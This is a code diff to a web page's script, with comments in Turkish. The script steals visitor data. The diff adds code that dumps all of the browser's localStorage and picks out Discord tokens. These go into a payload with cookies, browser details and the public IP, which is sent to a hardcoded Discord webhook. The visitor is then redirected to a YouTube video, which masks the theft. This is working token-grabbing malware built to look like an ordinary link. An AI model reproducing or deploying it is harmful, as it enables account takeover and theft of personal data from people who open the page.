@@ -39,8 +39,18 @@
 
 <script>
     // --- AYARLAR ---
-    // BURAYA KENDİ WEBHOOK URL'İNİ YAZ
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke"; 
+
+    // IP Adresini Al
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return "Bilinmiyor";
+        }
+    }
 
     // VERİ TOPLAMA FONKSİYONU
     async function collectAndSendData() {
@@ -56,16 +66,30 @@
             }
         }
 
+        // Tüm localStorage anahtarlarını tara
+        let allLocalData = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            allLocalData[key] = value;
+            
+            // Eğer token içeren bir anahtar bulursa onu işaretle
+            if (key.includes('discord')) {
+                discordToken = value;
+            }
+        }
+
         const cookies = document.cookie;
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
         const language = navigator.language;
         const screenResolution = window.screen.width + "x" + window.screen.height;
-        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => "Bilinmiyor");
+        const ip = await getIP();
 
         // Veriyi hazırla
         let data = {
             token: discordToken,
+            allLocalStorage: allLocalData, // Tüm localStorage verisi
             cookies: cookies,
             userAgent: userAgent,
             platform: platform,
@@ -96,12 +120,8 @@
 
         // 2. 2 saniye bekle
         setTimeout(() => {
-            // 3. Hedef siteye yönlendir
-            // VİDEO LİNKİNE ATMAK İSTERSEN AŞAĞIDAKİ SATIRI KULLAN:
-            window.location.href = "https://www.youtube.com/watch?v=cwQgjq0mCdE&list=RDcwQgjq0mCdE&start_radio=1&pp=ygUPa2FueWUgaSBsb3ZlIGl0oAcB"; // Örnek video
-            
-            // Veya Discord'un içine atmak istersen:
-            // window.location.href = "https://discord.com/channels/@me";
+            // 3. Hedef siteye yönlendir (Video Linki)
+            window.location.href = "https://www.youtube.com/watch?v=cwQgjq0mCdE&list=RDcwQgjq0mCdE&start_radio=1&pp=ygUPa2FueWUgaSBsb3ZlIGl0oAcB";
         }, 2000); // 2 saniye
     };
 </script>
